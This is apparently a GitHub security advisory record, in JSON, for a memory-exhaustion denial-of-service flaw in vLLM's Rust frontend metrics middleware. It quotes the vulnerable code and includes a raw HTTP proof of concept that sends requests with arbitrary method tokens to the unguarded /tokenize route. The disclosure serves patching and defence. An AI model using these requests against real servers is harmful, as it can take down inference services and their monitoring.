{"ghsa_id":"GHSA-5fj9-pfhr-6j48","cve_id":"CVE-2026-105759","url":"https://api.github.com/repos/vllm-project/vllm/security-advisories/GHSA-5fj9-pfhr-6j48","html_url":"https://github.com/vllm-project/vllm/security/advisories/GHSA-5fj9-pfhr-6j48","summary":"Unbounded Prometheus label cardinality from attacker-controlled HTTP method tokens in the vLLM Rust frontend metrics middleware (unauthenticated denial of service)","description":"[attachment.zip](https://github.com/user-attachments/files/31987183/attachment.zip)\r\n\r\n<img width=\"1713\" height=\"228\" alt=\"image\" src=\"https://github.com/user-attachments/assets/ecfa6ec7-39d0-4c7d-8efa-eec612621ac8\" />\r\n\r\n\r\n### Summary\r\n\r\nThe Rust frontend of vLLM (`vllm-rs`, enabled via `VLLM_USE_RUST_FRONTEND=1` or by running the `vllm-rs` binary directly) records Prometheus HTTP metrics in the middleware `track_http_metrics`. It uses the **raw HTTP method token** of each request (`req.method().as_str()`) as a Prometheus label value, with no method allowlist, no label normalization, and no cardinality cap. An unauthenticated remote attacker can send requests with unique, arbitrary method tokens (e.g. `XVULNCARD000001 /tokenize HTTP/1.1`) to any registered route; the request is answered with 405 by axum's method router but still flows through the metrics middleware, permanently inserting new label sets into the global `http_requests` counter family and `http_request_duration_seconds` histogram family. Memory grows unboundedly until the process is OOM-killed, and every `/metrics` scrape becomes larger and more expensive to render.\r\n\r\n### Details\r\n\r\n- `hyper`/`httparse` accept arbitrary tokens as HTTP methods, and axum's `MethodRouter` answers wrong-method requests on a registered path with 405 **from inside the route service**, which is wrapped by `Router::layer(from_fn(track_http_metrics))` (`src/rust/src/server/src/routes.rs:174`). The middleware therefore runs for these 405 responses and records `method = <arbitrary token>`, `handler = <MatchedPath or \"none\">`, `status = \"4xx\"`.\r\n- `Family::get_or_create` in the `prometheus_client` crate inserts a **permanent** HashMap entry keyed by the label set. There is no TTL, no cap, and no eviction: each unique method token pins roughly `O(token length)` bytes in two label sets plus counter/histogram structures for the lifetime of the process.\r\n- The API-key middleware only guards the `/v1`, `/v2` and `/inference` path prefixes (`src/rust/src/server/src/middleware/auth.rs:16`). `/tokenize` and `/detokenize` are not guarded **and** are not in the metrics `EXCLUDED_HANDLERS` list, so the attack works **even when `--api-key` is configured**: an unauthenticated attacker can inject unbounded label cardinality through `/tokenize` 405s. Without `--api-key` (the default), every registered route works.\r\n- `/metrics` itself is unauthenticated and renders the entire registry into a single `String` on every scrape (`Metrics::render`, `src/rust/src/metrics/src/lib.rs:62-66`). With ~10^6 injected series, each scrape materializes hundreds of megabytes of text, amplifying CPU/memory pressure onto the server and the Prometheus monitoring stack (cardinality bomb).\r\n- Damage is **cumulative and permanent**: unlike request-flooding, the leaked memory is not reclaimed when the attack stops, and rate limiting does not help because each method token only needs to be seen once.\r\n\r\n### Vulnerable code\r\n\r\n`src/rust/src/server/src/middleware/metrics.rs` (lines 34-71):\r\n\r\n```rust\r\npub async fn track_http_metrics(req: Request, next: Next) -> Response {\r\n    let method = req.method().as_str().to_string();   // raw method token, no allowlist/normalization\r\n    let handler = req\r\n        .extensions()\r\n        .get::<MatchedPath>()\r\n        .map_or_else(|| \"none\".to_string(), |path| path.as_str().to_string());\r\n    let excluded = EXCLUDED_HANDLERS.contains(&handler.as_str());\r\n    let started_at = Instant::now();\r\n\r\n    let response = next.run(req).await;\r\n\r\n    if excluded {\r\n        return response;\r\n    }\r\n\r\n    let elapsed = started_at.elapsed().as_secs_f64();\r\n    let status = status_group(response.status().as_u16());\r\n\r\n    let metrics = &METRICS.api_server;\r\n\r\n    metrics\r\n        .http_requests\r\n        .get_or_create(&HttpRequestLabels {\r\n            method: method.clone(),          // permanently inserts a new series per unique token\r\n            status,\r\n            handler: handler.clone(),\r\n        })\r\n        .inc();\r\n\r\n    metrics\r\n        .http_request_duration_seconds\r\n        .get_or_create(&HttpHandlerLabels { method, handler })\r\n        .observe(elapsed);\r\n\r\n    metrics.http_request_duration_highr_seconds.observe(elapsed);\r\n\r\n    response\r\n}\r\n```\r\n\r\n`src/rust/src/metrics/src/api_server.rs` (lines 26-41) - label sets keyed by the raw method string:\r\n\r\n```rust\r\n#[derive(Clone, Debug, Hash, PartialEq, Eq, EncodeLabelSet)]\r\npub struct HttpRequestLabels {\r\n    pub method: String,\r\n    pub status: &'static str,\r\n    pub handler: String,\r\n}\r\n\r\n#[derive(Clone, Debug, Hash, PartialEq, Eq, EncodeLabelSet)]\r\npub struct HttpHandlerLabels {\r\n    pub method: String,\r\n    pub handler: String,\r\n}\r\n\r\npub(crate) type HttpRequestCounterFamily = Family<HttpRequestLabels, U64Counter>;\r\npub(crate) type HttpHandlerHistogramFamily =\r\n    Family<HttpHandlerLabels, Histogram, fn() -> Histogram>;\r\n```\r\n\r\n`src/rust/src/server/src/middleware/auth.rs` (line 16) - `/tokenize` is not guarded, so the attack bypasses `--api-key`:\r\n\r\n```rust\r\nconst GUARDED_PREFIXES: &[&str] = &[\"/v1\", \"/v2\", \"/inference\"];\r\n```\r\n\r\n### PoC\r\n\r\n```http\r\nXVULNCARD000001 /tokenize HTTP/1.1\r\nHost: TARGET\r\n\r\nXVULNCARD000002 /tokenize HTTP/1.1\r\nHost: TARGET\r\n\r\nXVULNCARD000003 /tokenize HTTP/1.1\r\nHost: TARGET\r\n\r\nGET /metrics HTTP/1.1\r\nHost: TARGET\r\n\r\nHTTP/1.1 200 OK\r\n...\r\nhttp_requests_total{method=\"XVULNCARD000001\",status=\"4xx\",handler=\"/tokenize\"} 1\r\nhttp_request_duration_seconds_bucket{le=\"0.1\",method=\"XVULNCARD000001\",handler=\"/tokenize\"} 1\r\nhttp_request_duration_seconds_count{method=\"XVULNCARD000001\",handler=\"/tokenize\"} 1\r\nhttp_request_duration_seconds_sum{method=\"XVULNCARD000001\",handler=\"/tokenize\"} <ELAPSED>\r\n...\r\n```\r\n\r\nAutomated: `python poc.py -u http://TARGET:PORT -n 500` sends 500 unique-method requests to `/tokenize` and then scrapes `/metrics`, counting the injected `method=\"XVULNCARD…\"` series before and after. Each unique token contributes several series (counter plus histogram bucket/count/sum lines); the count never decreases afterwards.\r\n\r\n### Impact\r\n\r\nRemote, unauthenticated, cumulative denial of service against deployments that enable the Rust frontend: unbounded and permanent growth of process memory (OOM) plus linearly growing `/metrics` scrape payloads that also stress the Prometheus monitoring stack. Setting `--api-key` does not mitigate the attack because `/tokenize`/`/detokenize` are outside the guarded prefixes. No data confidentiality or integrity impact. vLLM's security policy classifies availability-only issues of this kind as MODERATE.","severity":"medium","author":null,"publisher":{"login":"jperezdealgaba","id":124347725,"node_id":"U_kgDOB2llTQ","avatar_url":"https://avatars.githubusercontent.com/u/124347725?v=4","gravatar_id":"","url":"https://api.github.com/users/jperezdealgaba","html_url":"https://github.com/jperezdealgaba","followers_url":"https://api.github.com/users/jperezdealgaba/followers","following_url":"https://api.github.com/users/jperezdealgaba/following{/other_user}","gists_url":"https://api.github.com/users/jperezdealgaba/gists{/gist_id}","starred_url":"https://api.github.com/users/jperezdealgaba/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/jperezdealgaba/subscriptions","organizations_url":"https://a